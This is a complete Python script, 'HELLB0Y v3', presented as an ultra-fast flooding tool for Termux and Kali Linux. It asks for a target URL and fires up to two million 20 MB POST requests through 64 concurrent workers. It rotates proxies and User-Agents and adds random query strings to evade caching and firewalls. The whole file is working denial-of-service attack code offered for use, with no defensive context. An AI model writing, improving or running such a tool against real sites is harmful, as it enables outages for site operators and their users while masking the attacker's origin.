#!/usr/bin/env python3
"""
HELLB0Y v3 - High-throughput flooding tool (Ultra‑fast)
- 64 concurrent workers (adjustable)
- Random User‑Agent, random proxy, random query string (anti‑cache)
- 20 MB payload: 🥰😂👿👿👿 repeated
- Real‑time progress (success/fail per second)
- Optimised for Termux & Kali Linux
"""

import requests
import time
import sys
import threading
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------------------------
#  BANNER
# ---------------------------
BANNER = """
██╗  ██╗███████╗██╗     ██╗     ██████╗  ██████╗ ██╗   ██╗
██║  ██║██╔════╝██║     ██║     ██╔══██╗██╔═══██╗╚██╗ ██╔╝
███████║█████╗  ██║     ██║     ██████╔╝██║   ██║ ╚████╔╝ 
██╔══██║██╔══╝  ██║     ██║     ██╔══██╗██║   ██║  ╚██╔╝  
██║  ██║███████╗███████╗███████╗██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═════╝  ╚═════╝    ╚═╝   
"""
print(BANNER)
print(">>> HELLB0Y v3 - ULTRA FLOOD (64x) <<<\n")

# ---------------------------
#  INPUT
# ---------------------------
URL = input("Enter target URL: ").strip()
if not URL:
    print("No URL provided. Exiting.")
    sys.exit(1)

PROXY_FILE = input("Path to proxy list file (Enter to skip): ").strip()
proxies = []
if PROXY_FILE:
    try:
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
        print(f"[+] Loaded {len(proxies)} proxies")
    except FileNotFoundError:
        print(f"[!] File '{PROXY_FILE}' not found. No proxies used.")
else:
    print("[!] No proxies – all traffic from your IP.")

while True:
    try:
        qty = int(input("Number of requests (max 2,000,000): "))
        if 1 <= qty <= 2_000_000:
            break
        print("Please enter a number between 1 and 2,000,000.")
    except ValueError:
        print("Invalid number.")

TOTAL_REQUESTS = qty
PAYLOAD_SIZE_MB = 20
CONCURRENT_WORKERS = 64          # 64x speed compared to previous 32

# ---------------------------
#  PAYLOAD (20 MB of given emojis)
# ---------------------------
emoji_str = "🥰😂👿👿👿"           # exactly as requested
emoji_bytes = emoji_str.encode("utf-8")
repeats = (PAYLOAD_SIZE_MB * 1024 * 1024) // len(emoji_bytes) + 1
payload = (emoji_bytes * repeats)[:PAYLOAD_SIZE_MB * 1024 * 1024]

# ---------------------------
#  SHARED DATA & LOCKS
# ---------------------------
lock = threading.Lock()
count_success = 0
count_fail = 0
start_time = time.time()

# ---------------------------
#  USER-AGENTS & HEADERS
# ---------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
]

def get_random_proxy():
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {'http': proxy, 'https': proxy}

def send_request(request_id):
    global count_success, count_fail
    success = False

    # Random query parameter to bypass cache / WAF
    rand_param = f"?_={random.randint(1, 999999)}"
    url_with_rand = URL + rand_param

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    proxy_dict = get_random_proxy()
    try:
        # Using session? Not necessary; each request is independent.
        resp = requests.post(
            url_with_rand,
            data=payload,
            headers=headers,
            proxies=proxy_dict,
            timeout=30,
            verify=False       # Disable SSL verification for speed (ignore cert errors)
        )
        if 200 <= resp.status_code < 300:
            success = True
    except Exception:
        success = False

    with lock:
        if success:
            count_success += 1
        else:
            count_fail += 1
    return success

# ---------------------------
#  PROGRESS THREAD (removed delays, only prints every second)
# ---------------------------
def show_progress():
    while True:
        time.sleep(1)
        with lock:
            done = count_success + count_fail
            if done >= TOTAL_REQUESTS:
                break
            elapsed = time.time() - start_time
            rate = done / elapsed if elapsed > 0 else 0
            # Overwrite line with current stats
            print(f"\r[+] Sent: {done}/{TOTAL_REQUESTS} | "
                  f"✔ Success: {count_success} | ✘ Fail: {count_fail} | "
                  f"⚡ {rate:.1f} req/s   ", end='', flush=True)

# ---------------------------
#  MAIN
# ---------------------------
print(f"\n[*] Target: {URL}")
print(f"[*] Total requests: {TOTAL_REQUESTS}")
print(f"[*] Payload: {PAYLOAD_SIZE_MB} MB (🥰😂👿👿👿)")
print(f"[*] Workers: {CONCURRENT_WORKERS}")
if proxies:
    print(f"[*] Proxies: {len(proxies)} random IPs per request")
print("[*] SSL verification: DISABLED (for speed)\n")
print("[*] Flooding started (progress updates every second)...\n")

progress_thread = threading.Thread(target=show_progress, daemon=True)
progress_thread.start()

with ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
    futures = {executor.submit(send_request, i): i for i in range(TOTAL_REQUESTS)}
    for future in as_completed(futures):
        pass   # We don't need to process results individually

# Final newline
print()
elapsed = time.time() - start_time
print("\n==================== FINAL RESULTS ====================")
print(f" Total time:        {elapsed:.2f} seconds")
print(f" Successful:        {count_success}")
print(f" Failed:            {count_fail}")
if TOTAL_REQUESTS > 0:
    print(f" Success rate:      {count_success / TOTAL_REQUESTS * 100:.2f}%")
if elapsed > 0:
    print(f" Average rate:      {TOTAL_REQUESTS / elapsed:.2f} req/s")
print("======================================================")
